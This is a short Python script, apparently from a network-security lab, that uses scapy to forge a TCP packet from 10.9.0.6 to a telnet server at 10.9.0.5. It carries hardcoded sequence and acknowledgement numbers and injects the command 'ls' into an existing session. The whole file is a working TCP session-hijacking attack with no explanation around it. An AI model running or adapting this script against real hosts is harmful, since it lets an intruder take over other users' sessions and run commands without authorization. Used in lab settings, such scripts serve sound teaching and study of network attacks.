#!/usr/bin/env python3
from scapy.all import *
eth = Ether(src="02:42:0a:09:00:06", dst="02:42:0a:09:00:05")
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=59956, dport=23, flags="AP", seq=516336020, ack=2142703271)
data = "ls\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)